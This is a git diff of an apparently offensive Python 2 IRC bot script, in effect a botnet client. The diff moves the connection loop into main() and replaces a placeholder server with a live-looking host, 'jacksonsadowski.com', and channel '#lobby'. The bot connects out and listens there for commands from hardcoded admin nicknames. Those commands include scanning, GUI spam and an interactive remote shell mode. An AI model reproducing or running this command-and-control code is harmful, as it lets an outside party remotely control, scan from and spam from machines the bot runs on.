@@ -26,6 +26,13 @@ from sys import argv
 from random import randint
 import getpass
 
+#global stuff
+operatingSystem = ""
+INTERACT = []
+admins = []
+nick = ""
+DEBUG = 1
+channel = 0
 
 def generateNick(operatingSystem): #generates a nick for the server
 	if not operatingSystem:
@@ -444,7 +451,7 @@ def parseCommand(command):
 					INTERACT[1] = 1
 
 #code to connect to an IRC server
-def connectToServer(nick):
+def connectToServer(nick, server, port):
 	print "connecting to:", server
 
 	connected = 0
@@ -484,28 +491,48 @@ def connectToServer(nick):
 	else:
 		return nick
 
-		
-#debugger
-DEBUG = 1
-if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
+def main():
+	#debugger
 	DEBUG = 1
+	if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
+		DEBUG = 1
 
-#other vars
-if argv[0][:2] == "./": #if we used ./ to run it, then get rid of those two characters
-	argv[0] = argv[0][2:]
-operatingSystem = platform.system().lower() #detected os in all lowercase
-INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
-						#index two is the boolean for if the interactive shell is with this bot
-						#index three is mode indicator. if >0 we are in shell mode, if <0 we are in functions mode
+	#other vars
+	if argv[0][:2] == "./": #if we used ./ to run it, then get rid of those two characters
+		argv[0] = argv[0][2:]
+	operatingSystem = platform.system().lower() #detected os in all lowercase
+	INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
+							#index two is the boolean for if the interactive shell is with this bot
+							#index three is mode indicator. if >0 we are in shell mode, if <0 we are in functions mode
 
-#IRC Settings
-admins = ["king", "blackbear", "bigshebang"]
-server = "serverhere"
-port = 6667
-channel = "#channelhere"
-nick = generateNick(operatingSystem)
+	#IRC Settings
+	admins = ["king", "blackbear", "bigshebang"]
+	server = "jacksonsadowski.com"
+	port = 6667
+	channel = "#lobby"
+	nick = generateNick(operatingSystem)
 
-print "The botnick is: '%s'" % nick
+	print "The botnick is: '%s'" % nick
+
+	#setting up the sockets
+	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
+	nick = connectToServer(nick, server, port) #connect to IRC server
+
+	#infinite loop to listen for messages aka commands
+	while 1:
+		text = irc.recv(1024) #receive up to 1024 bytes
+		while not text: #if text we receive is less than 1, the other end isn't connected anymore. try to reconnect
+			irc.close()
+			irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
+			connectToServer(nick, server, port)
+			time.sleep(5)
+			text = irc.recv(1024) #receive up to 1024 bytes
+
+		#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
+		if text.find('PING') != -1: #check if 'PING' is found
+			irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server to prevent pinging out
+
+		parseCommand(text) #call function to parse commands
 
 #dictionary of functions that DO NOT take parameters
 commands = {
@@ -537,24 +564,7 @@ commandsParams = {
 	"guispam" : guiSpam,
 	"admin" : admin,
 	"scan" : scanner
-}		
+}
 
-#setting up the sockets
-irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
-nick = connectToServer(nick) #connect to IRC server
-
-#infinite loop to listen for messages aka commands
-while 1:
-	text = irc.recv(1024) #receive up to 1024 bytes
-	while not text: #if text we receive is less than 1, the other end isn't connected anymore. try to reconnect
-		irc.close()
-		irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
-		connectToServer(nick)
-		time.sleep(5)
-		text = irc.recv(1024) #receive up to 1024 bytes
-
-	#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
-	if text.find('PING') != -1: #check if 'PING' is found
-		irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server to prevent pinging out
-
-	parseCommand(text) #call function to parse commands
+if __name__ == "__main__":
+	main()
